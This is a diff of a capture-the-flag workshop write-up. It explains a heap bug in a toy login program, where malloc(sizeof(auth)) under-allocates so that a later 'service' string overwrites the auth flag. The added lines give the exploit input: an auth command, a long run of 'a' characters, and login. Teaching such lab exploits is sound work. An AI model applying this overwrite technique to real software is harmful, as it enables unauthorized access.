@@ -1,3 +1,5 @@
+So the first thing we notice is a struct. We will come back to this later
+
 ```
 struct auth { //note the lack of typedef
   char name[32];
@@ -23,7 +25,7 @@ if(strncmp(line, "auth ", 5) == 0)
 }
 ```
 
-Let's take this line by line and look at the corresponding assembly
+and the corresponding assembly
 
 ```
 auth = malloc(sizeof(auth)); // should be sizeof(struct auth)
@@ -36,35 +38,17 @@ auth = malloc(sizeof(auth)); // should be sizeof(struct auth)
 8048678:	83 c4 10             	add    esp,0x10
 804867b:	a3 e8 9a 04 08       	mov    ds:0x8049ae8,eax
 ```
-This is the main bug in this program. Because the dev wrote `sizeof(auth)` and not `sizeof(struct auth)`, there will be `0x4` bytes of memory (the size of \*`auth`) allocated and not `0x24` (the size of `struct auth`).
+This is the main bug in this program. Because the dev wrote `sizeof(auth)` and not `sizeof(struct auth)`, there will be `0x4` bytes of memory (the size of `*auth`) allocated and not `0x24` (the size of `struct auth`).
 
 
 
 
-Lets see what happens with the service case
+Lets see what happens with the service case.
 ```
 if(strncmp(line, "service", 6) == 0)
     service = strdup(line + 7); //this will stored on the heap
 ```
-notice that we do not have any restrictions
-
-```
-80486fc:	6a 06                	push   0x6
-80486fe:	68 59 88 04 08       	push   0x8048859
-8048703:	8d 85 78 ff ff ff    	lea    eax,[ebp-0x88]
-8048709:	50                   	push   eax
-804870a:	e8 e1 fd ff ff       	call   80484f0 <strncmp@plt>
-804870f:	83 c4 10             	add    esp,0x10
-8048712:	85 c0                	test   eax,eax
-8048714:	75 1a                	jne    8048730 <main+0x135>
-8048716:	8d 85 78 ff ff ff    	lea    eax,[ebp-0x88]
-804871c:	83 c0 07             	add    eax,0x7
-804871f:	83 ec 0c             	sub    esp,0xc
-8048722:	50                   	push   eax
-8048723:	e8 28 fd ff ff       	call   8048450 <strdup@plt>
-8048728:	83 c4 10             	add    esp,0x10
-804872b:	a3 ec 9a 04 08       	mov    ds:0x8049aec,eax
-```
+Notice that we do not have any restrictions on the amount of memory allocated.
 
 
 Let's take a look at the login command
@@ -97,4 +81,13 @@ if(auth->auth)
 
 ![A basic visualization](https://github.com/kablaa/CTF-Workshop/blob/master/writeups/heap2/heap.png)
 
-So what is happening is this: Because only 0x4 bytes are being allocated on the heap, and because `auth->auth` is at `<location of auth> + 0x20`, `service` is now located _before_ `auth->auth`. So we can overwrite the value.  
+So what is happening is this: Because only 0x4 bytes are being allocated on the heap, and because `auth->auth` is at `<location of auth> + 0x20`, `service` is now located _before_ `auth->auth`. So we can overwrite the value.
+
+so we can run
+```
+auth lessthan32bits
+service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+login
+```
+
+This is why we should be careful with how we name our variables kids!
